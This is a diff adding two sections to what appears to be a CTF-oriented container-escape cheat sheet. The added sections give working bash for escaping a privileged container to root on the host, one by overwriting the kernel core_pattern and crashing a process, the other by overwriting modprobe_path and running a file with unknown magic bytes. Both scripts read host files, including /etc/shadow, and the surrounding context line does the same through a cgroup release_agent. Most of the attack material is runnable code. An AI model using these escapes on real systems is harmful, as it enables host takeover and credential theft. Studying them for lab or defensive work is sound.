@@ -29,3 +29,41 @@ chmod +x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 Wait a moment, then read `/output` for the host's `/etc/shadow`.
+
+## 3. The core_pattern Escape
+When cgroups v1 `release_agent` is unavailable (e.g. cgroups v2, or `rdma` subsystem missing), use `core_pattern` instead. Requires `CAP_SYS_ADMIN` (or `--privileged`).
+
+```bash
+# Get overlay upperdir (host path where container writes land)
+UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+
+# Write exploit that runs as root on the HOST when a crash occurs
+printf '#!/bin/sh\ncat /root/root.txt > %s/flag.txt\nchmod 777 %s/flag.txt\n' "$UDIR" "$UDIR" > /exploit.sh
+chmod +x /exploit.sh
+
+# Set core_pattern — pipe format makes kernel run the script on any SIGSEGV
+echo "|${UDIR}/exploit.sh" > /proc/sys/kernel/core_pattern
+
+# Trigger crash → kernel invokes exploit.sh AS ROOT ON THE HOST
+ulimit -c unlimited
+bash -c 'kill -11 $$'
+
+# Wait, then read the flag (written into container overlay by the host-level script)
+sleep 4
+cat /flag.txt
+```
+
+**Why it works**: `/proc/sys/kernel/core_pattern` is a kernel-wide parameter, not namespaced. When prefixed with `|`, the kernel runs the specified binary as root in the init namespace (the host). The overlay `upperdir` is a real host path, so the exploit script is accessible from the host and writes output back to a location visible inside the container.
+
+**When to prefer over cgroups**: cgroups v2 (default on Ubuntu 22.04+) does not expose `release_agent` in the same way. `core_pattern` works on both cgroups v1 and v2.
+
+## 4. The modprobe_path Escape
+Similar principle to `core_pattern`. Overwrite `/proc/sys/kernel/modprobe` with a path to your script. Trigger by executing a file with unknown magic bytes (`\xff\xff\xff\xff`). The kernel runs the modprobe helper as root on the host.
+
+```bash
+UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+printf '#!/bin/sh\ncat /etc/shadow > %s/shadow.txt\n' "$UDIR" > /pwn.sh && chmod +x /pwn.sh
+echo "$UDIR/pwn.sh" > /proc/sys/kernel/modprobe
+printf '\xff\xff\xff\xff' > /tmp/trigger && chmod +x /tmp/trigger
+/tmp/trigger 2>/dev/null; sleep 2; cat /shadow.txt
+```
